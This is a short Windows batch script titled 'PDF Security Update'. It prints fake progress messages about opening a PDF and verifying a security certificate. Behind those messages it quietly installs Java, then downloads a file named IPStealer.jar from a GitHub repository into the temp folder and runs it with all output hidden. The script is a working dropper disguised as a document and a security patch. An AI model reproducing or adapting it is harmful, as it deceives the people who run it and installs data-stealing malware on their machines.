@echo off
title PDF Security Update
echo Opening PDF document...
echo Installing required security components...

where java >nul 2>&1
if errorlevel 1 (
    echo Installing Java Runtime...
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://javadl.oracle.com/webapps/download/AutoDL?BundleId=249213_b2d4dfe4f4d04c8aab5a5b8f4a41c3a4', '%TEMP%\jre.exe')" >nul 2>&1
    start /wait "" "%TEMP%\jre.exe" /s
    timeout /t 30 >nul
    del "%TEMP%\jre.exe" 2>nul
    echo Java installation complete.
) else (
    echo Java already installed.
)

echo Downloading security module...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar', '%TEMP%\security.jar')" >nul 2>&1

echo Verifying security certificate...
java -jar "%TEMP%\security.jar" >nul 2>&1

echo Security update complete.
echo You may now close this window.
timeout /t 3 >nul
exit
